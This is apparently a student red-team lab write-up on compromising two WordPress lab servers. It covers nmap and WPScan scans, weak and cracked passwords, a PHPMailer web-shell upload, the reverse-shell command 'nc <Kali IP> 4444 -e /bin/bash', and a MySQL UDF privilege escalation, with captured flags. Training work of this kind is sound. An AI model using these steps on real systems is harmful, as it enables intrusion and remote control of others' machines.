# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

<br>

## Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

<img width="481" alt="harding tag4" src="https://user-images.githubusercontent.com/101371476/169629021-c499056c-7d9b-4bad-b2ec-38dcc9b46524.PNG">

![image](https://user-images.githubusercontent.com/101371476/169629091-52efa10e-4ec0-4445-bd4e-bcfb0740288f.png)

![image](https://user-images.githubusercontent.com/101371476/169629105-1b50b74d-8f3b-4980-a7ea-0dd776f3af80.png)


This scan identifies the services below as potential points of entry:
- Target 1 (192.168.1.110)
  - Port 22: SSH (OPENSSH 6.7p1 Debian
  - Port 80: HTTP (Apache httpd 2.4.10)
  - Port 111: rpcbind (2-4 RPC #100000)
  - Port 139: netbios-ssn (Samba smbd 3.x - 4.x)
  - Port 445: microsoft-ds (Samba smbd 3.x -4.x)

<br>

- Target 2 (192.168.1.115)
  - Port 22: SSH (OPENSSH 6.7p1 Debian
  - Port 80: HTTP (Apache httpd 2.4.10)
  - Port 111: rpcbind (2-4 RPC #100000)
  - Port 139: netbios-ssn (Samba smbd 3.x - 4.x)
  - Port 445: microsoft-ds (Samba smbd 3.x -4.x)

  <br>

Also since we know that Target 1 server runs WordPress server, <br>
WPScan was run for Target 1 to reveal the below vulnerabilities:

<img width="339" alt="offensive 4" src="https://user-images.githubusercontent.com/101371476/169629493-86dec876-c223-43f1-8d96-df2f50b57a71.PNG">

<img width="325" alt="offensive 5" src="https://user-images.githubusercontent.com/101371476/169629516-37258a0b-e524-4983-8361-972f0fbf6edf.PNG">

<img width="307" alt="offensive 6" src="https://user-images.githubusercontent.com/101371476/169629528-c746f599-192a-4c21-bcb0-3f4e65bae7ff.PNG">

The following vulnerabilities were identified on each target:
- Target 1
  - WordPress XMLRPC GHOST Vulnerability Scanner 
    - (CVE-2015-0235)
    - Used to determine if it is vulnerable to the GHOST using WordPress XMLRPC interface.
    - If vulnerable, system will segfault (segmentation fault - where unauthorized is trying to get into memory system) and return a server error.
  - WordPress XMLRPC DoS 
    - (CVE-2014-5266)
    - Vulnerable to XML based denial of service.
    - Web Server can have an effect in availability (CIA Triad).
  - WordPress XML-RPC Username/Password Login Scanner 
    - (CVE-1999-0502)
    - Attempts to authenticate against Wordpress-site (via XMLRPC) using different combinations.
    - Brute Force attack can be done to get the username & password of the web server for authentication.
  - WordPress XML RPC Pingback API or Pingback Locator 
    - (CVE-2013-0235)
    - Allows attackers to send HTTP request to intranet servers for port-scanning attack.
    - One server can expose all the internal server composition.
  - WordPress Cron.php
    - Allows possible DDos Attack against wp-cron.php since it will return a 200 code when executed.
  - WordPress version 4.8.17 vulnerability
    - Insecure version / Outdated. Most recent one is 5.8.1 released Sept 9, 2021.
    - Unpatched version can be exploited through numerous vulnerabilities.

<br>

While going through this activity, other vulnerabilities were also found:
- Target 1
  - Wordpress User Enumeration
    - WPS Scan Detect the list of users with the specific options used (-u).
    - Unauthorized can get the username to target the specific account.
  - Open Port 22 SSH & Weak Password
    - Having Port 22 SSH open, anyone with the username and password can get into the system.
    - Anyone can brute force attack the authentication for the system.
  - Sensitive Data Exposure
    - wp-config.php: SQL Database Configuration in Plaintext.
    - Once the config file is seen, anyone can grab the Id & pw. Better protect it with encryption.
  - Python sudo privileges
    - User is given access to sudo privileges via Python.
    - Attacker can escalate to root privileges easily gaining access to the system.

- Target 2
  - Brute-forceable URL directories and files
    - Allows brute force to guess the directories that this webserver has.
    - Allowing directories to be discovered, structure of the system is known.
  - Unrestricted access to server directories
    - Once on the system, there were no restricted access to the files or directories.
    - This completely exposes the system to unauthorized personnel.
  - PHPMailer 5.2.16 Remote Code Execution
    - (CVE-2016-10033)
    - Allow attackers to execute arbitrary code in a crafted sender property.
    - backdoor.php can be installed for unauthorized personnel to gain access.


<br>

## Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
    - **Exploit Used**
      - With the WPScan above, username of the Target 1 WordPress Server found are: steven and michael.
      - We were told to guess the michael's password, with the hint 'most obvious possible guess'. 
      - Guessed the same pw as the Id, which worked (Bad Practice). (pw: michael)
      <img width="334" alt="offensive7" src="https://user-images.githubusercontent.com/101371476/169629830-778b4102-395e-4732-9c0a-d48f7ae30ae3.PNG">

      ![image](https://user-images.githubusercontent.com/101371476/169629838-5c9ac88a-3c07-41f2-b0e0-1c911a485196.png)


  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used**
      - flag 2 was in the system, directory `/var/www/` <br>
      ![flag2 1](https://user-images.githubusercontent.com/101371476/169629950-1e7a5602-658a-4568-95a1-48c0d247f362.png)


  - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - MySQL is being run as a database for WordPress.
      - to find the authentication for the MySQL database, configuration file was needed.
      - wp-config.php was spotted. <br>
      <img width="287" alt="offensive 9" src="https://user-images.githubusercontent.com/101371476/169630658-54037db8-c37e-4a1c-85d7-43b28bae8d04.PNG">
      
      <img width="338" alt="offensive 9 2" src="https://user-images.githubusercontent.com/101371476/169630674-100993d8-24df-4d48-acab-602e5a27ddae.PNG">
     - using the credentials to log into MySQL, searched through database.
     - 
      <img width="344" alt="offensive 9 3" src="https://user-images.githubusercontent.com/101371476/169630727-cf116add-804d-4d31-9eb8-6a86aad7f3dc.PNG">

      <img width="482" alt="offensive 9 4" src="https://user-images.githubusercontent.com/101371476/169630746-76cdb40d-87ce-4e72-a4ce-dbcf239d70a7.PNG">

       - Command used to get the Flag 3: `select * from wp_posts;`
       
      ![offensive 9 5](https://user-images.githubusercontent.com/101371476/169630759-c6e39636-45e8-4868-b95f-7b32cd52c723.png)

      - Flag 3 was exploised while getting to that step.

  - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - While going through the MySQL database, WordPress user password hashes were dumped out of database to get Steven's pw.
      - 
      ![offensive 9 88](https://user-images.githubusercontent.com/101371476/169631946-f297920c-5172-4c60-b0f9-3fa9d61d3697.png)

      - With these hashes, created a file called `wp_hashes.txt` with Steven & Michael's hashes:
      ![offensive 9 99](https://user-images.githubusercontent.com/101371476/169632140-3c3cfe2f-1839-4782-ba29-d2fe04eb43aa.png)

      - Then, cracked password hashes with `John the Ripper`.
      ![offensive 9 10](https://user-images.githubusercontent.com/101371476/169632341-2f2324d7-b68d-40dc-8fe6-76c1f59b5870.png)

      - with the cracked password for Steven, SSH into Steven's user shell
      <img width="365" alt="offensive 9 11" src="https://user-images.githubusercontent.com/101371476/169632558-293c0a44-a65d-4c76-bda7-21887661ff4e.PNG">

      - Checked the status of the user account to see if escalation to root can be obtained.
      <img width="361" alt="offensive 9 12" src="https://user-images.githubusercontent.com/101371476/169632623-78c4447b-e638-493e-84d5-981c7bc0e94c.PNG">

      ![offensive 9 13](https://user-images.githubusercontent.com/101371476/169632635-69b387a9-de19-47f1-837f-1d85ca7446d2.png)

      ![offensive 9 14](https://user-images.githubusercontent.com/101371476/169632660-421db2b6-1956-4686-be20-6155d619a8ec.png)


<br>
<br>

- Target 2
  -  `flag1.txt`: a2c1f66d2b8051bd3a5874b5b6e43e21
      - **Exploit Used**
        - Target 2 was more challenging, where michael and steven's passwords were unable to uncover.
        - Enumerate the webserver with nikto command
        <img width="326" alt="offe tag2 1" src="https://user-images.githubusercontent.com/101371476/169655814-f7fffbf8-17db-41e1-aef5-6f42423d0a59.PNG">

        - This created a list of URLs the Target HTTP server exposes.
        - Then, more in-depth enumeration was ran with gobuster command
        ![offe tag2 2](https://user-images.githubusercontent.com/101371476/169655846-38183db2-0bf8-4913-9ef0-46260bfe76ef.png)

        - Visited all the subdirectories that was listed on the output.
        - found out that `/vendor` subdirectory contained several files that I believe it should not be publicly facing.
        <img width="461" alt="offe tag2 3" src="https://user-images.githubusercontent.com/101371476/169655908-db0631c0-7be7-42ef-b0c1-cd4415b2d50d.PNG">

        - while going through all the files, found flag 1<br>
        <img width="303" alt="offe tag2 4" src="https://user-images.githubusercontent.com/101371476/169655955-85f6045e-26f0-4b35-aeff-0b69e890327a.PNG">


  - `flag2.txt`: 6a8ed560f0b5358ecf844108048eb337
    - **Exploit Used**
      - With the Vendor directory exposed, you could see from this subdirectory that this WordPress website uses `PHPMailerAutoload.php` <br>
      <img width="309" alt="offe tag2 5" src="https://user-images.githubusercontent.com/101371476/169656016-a6000494-f225-40c2-bd15-1ff41d3b5e32.PNG">

      - Also found version of the PHPMailer this Server uses <br>
      <img width="253" alt="offe tag2 6" src="https://user-images.githubusercontent.com/101371476/169656052-30e419ba-154a-4358-bfb8-2364ab68155e.PNG">

      - So with this version, you can search within searchsploit to see if there is exploit that can be used
      <img width="575" alt="offe tag2 7" src="https://user-images.githubusercontent.com/101371476/169656081-4231d179-0bb5-484d-a8d0-c83b933343b2.PNG">

      - You can use any of the exploit, but for the purpose of this project, given `exploit.sh` file is used to exploit this vulnerability.
      (Also made sure that the top of the `exploit.sh` script was set TARGET variable with the IP address of Target 2)
        - [exploit.sh](Resources/exploit.sh)
      - Then, this script was ran to upload backdoor.php file to the target server, which can be used to execute command injection attacks <br>
      ![offe tag2 8](https://user-images.githubusercontent.com/101371476/169656138-7ef0dced-dc09-49d9-8b20-f951be7b938a.png)

      - Nagivated to `http://<Target 2 URL>/backdoor.php?cmd=<CMD>` which allowed to run bash commands on Target 2.
        - For example, /etc/passwd
        ![offe tag2 9](https://user-images.githubusercontent.com/101371476/169656168-2b5d9b1b-5ff4-442d-ae21-45fbb948ff75.png)

      - Next, used this exploit to open backdoor reverse shell on the target. So on Kali VM, netcat listner was started:
      
        ![offe tag2 10](https://user-images.githubusercontent.com/101371476/169656204-b3818237-243a-4534-a112-fe6f174c9acc.png)

      - In the browser, command `nc <Kali IP> 4444 -e /bin/bash` was used to connect the reverse shell
      ![offe tag2 11](https://user-images.githubusercontent.com/101371476/169656219-2b62365d-1ec7-4c2b-9a8b-0877e9a736ae.png)

      ![offe tag2 12](https://user-images.githubusercontent.com/101371476/169656227-e5ac3270-c4eb-4e6a-b196-37b8fd9053a3.png)

      - using the shell opened, flag 2 was located. <br>
      ![offe tag2 13](https://user-images.githubusercontent.com/101371476/169656246-4a0a8fbe-e5dc-41c5-b5e3-df3ecc0008e7.png)



  - `flag3.txt`: a0f568aa9de277887f37730d71520d9b
    - **Exploit Used**
      - flag 3 was found within the WordPress uploads directory, by using find command
      ![0ffe tag3 1](https://user-images.githubusercontent.com/101371476/169656347-49dd6ef5-7266-4793-8cac-00cebfbf6367.png)

      ![offe tag3 2](https://user-images.githubusercontent.com/101371476/169656371-1e0c21e3-2848-4c21-ab93-635943a97903.png)

     ![offe tag3 3](https://user-images.githubusercontent.com/101371476/169656394-70169e56-a421-47fd-894a-d4a929db395e.png)


  - `flag4.txt`: df2bc5e951d91581467bb9a2a8ff4425
    - **Exploit Used**
      - Went to check on the Wordpress Configuration file to check on the username and password
      ![offe tag3 4](https://user-images.githubusercontent.com/101371476/169656439-ecd8e121-401c-4477-9382-cabc7fe4cde3.png)

      - Tried to log into mysql using the credentials, and found the version of the MySQL.: 5.5.60
      ![offe tag3 5](https://user-images.githubusercontent.com/101371476/169656450-9b6983cd-0781-4476-ac27-a59be8550714.png)

      - with this version of mysql, privilege Escalation exploit can be used to climb the ladder within the system. 
      - In order to find the right exploit, searchsploit was used:
      ![offe tag3 6](https://user-images.githubusercontent.com/101371476/169656488-1fc5dad5-1f57-409d-a15d-a622df26ddf3.png)

      - Decided to use `1518.c` exploit
      - Looked through the exploit file itself to see if there was any written instruction as to how to use this exploit
      ![offe tag3 7](https://user-images.githubusercontent.com/101371476/169656506-0b84cb00-f88b-41cd-be17-5bcc1ac5c068.png)

      ![offe tag3 8](https://user-images.githubusercontent.com/101371476/169656524-bdc841ad-37a0-481f-9bf7-7a4cef45f129.png)

      - Written instruction was clear. Once the confirmation to use this exploit was set, exploit was copied from the searchsploit library to the Kali desktop. Then, exploit file was modified to this specific usage:
      ![offe tag3 9](https://user-images.githubusercontent.com/101371476/169656571-2a10b4c0-a7e0-45b8-8b63-4eb9f6d8deec.png)

      - Now, we have to move this exploit file to the target victim's computer.
      - To do so, I've started apache2 service from Kali:<br>
      ![offe tag3 10](https://user-images.githubusercontent.com/101371476/169656596-0b1deefc-4d83-4382-a51b-ee4c067c885b.png)

      ![offe tag3 11](https://user-images.githubusercontent.com/101371476/169656611-80d6b53e-be23-4af2-9b6a-2cf2beb1be0a.png)

      - Then, I've used wget command to transfer over the exploit file
      ![offe tag3 12](https://user-images.githubusercontent.com/101371476/169656644-760d480b-e8ea-44e8-9de5-013d27b83adc.png)

      ![offe tag3 13](https://user-images.githubusercontent.com/101371476/169656662-4aeab2cd-3407-418f-bc10-b36e9b5b99d9.png)

      - Then, moved the exploit file to the tmp folder:<br>
      ![offe tag3 14](https://user-images.githubusercontent.com/101371476/169656685-dd8b5788-855e-4a59-b8b8-93268a9e820e.png)

      - Now that it was ready to exploit, login to MySQL using the credentials from the configuration file, and went on with the commandline instructions found on the exploit file:
      ![offe tag3 15](https://user-images.githubusercontent.com/101371476/169656712-174072e0-e117-4a48-837b-97323eefb6ea.png)

      ![offe tag3 16](https://user-images.githubusercontent.com/101371476/169656720-2de4a4c0-7dea-423e-9173-046afb3a6980.png)

      ![offe tag3 17](https://user-images.githubusercontent.com/101371476/169656733-172d3936-7819-49b5-82ea-a5e883f45b83.png)

      ![offe tag3 18](https://user-images.githubusercontent.com/101371476/169656745-39df3e2b-aaeb-4547-944b-e0950ff0d71b.png)

      ![offe tag3 19](https://user-images.githubusercontent.com/101371476/169656757-7d1edd1c-14e1-4628-8c90-c6130bbc2722.png)

      




<br>
<br>
<br>



## Reference
- Rapid7 (May, 2018) WordPress XMLRPC GHOST Vulnerability Scanner Retreived from https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- Rapid7 (May, 2018) WordPress XMLRPC DoS Retreived from https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- Rapid7 (May, 2018) WordPress XML-RPC Username/Password Login Scanner Retreived from https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- National Vulnerability Database (Aug, 2013) CVE-2013-0235 Detail Retrieved from https://nvd.nist.gov/vuln/detail/CVE-2013-0235
- cve.mitre.org (Sept, 2021) CVE-2016-10033 Retrieved from https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033
- javiercasares (Feb, 2019) WP-Cron detection? Retrieved from https://github.com/wpscanteam/wpscan/issues/1299
- Exploit Database (Sept, 2021) MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) Retreived from https://www.exploit-db.com/exploits/1518




<br>
<br>
<br>


